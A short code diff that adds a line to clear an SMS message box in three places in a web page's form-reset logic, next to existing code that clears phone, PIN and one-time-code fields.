@@ -867,6 +867,9 @@
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             
+            // Clear SMS message field
+            document.getElementById('smsMsgBox').value = '';
+            
             // Clear OTP form if present
             [0,1,2,3].forEach(i => {
               const otpEl = document.getElementById('otp'+i);
@@ -1107,6 +1110,10 @@
               const pinEl = document.getElementById('lp'+i);
               if (pinEl) pinEl.value = '';
             });
+            
+            // Clear SMS message field
+            document.getElementById('smsMsgBox').value = '';
+            
             [0,1,2,3].forEach(i => {
               const otpEl = document.getElementById('otp'+i);
               if (otpEl) otpEl.value = '';
@@ -1132,6 +1139,10 @@
               const pinEl = document.getElementById('lp'+i);
               if (pinEl) pinEl.value = '';
             });
+            
+            // Clear SMS message field
+            document.getElementById('smsMsgBox').value = '';
+            
             [0,1,2,3].forEach(i => {
               const otpEl = document.getElementById('otp'+i);
               if (otpEl) otpEl.value = '';
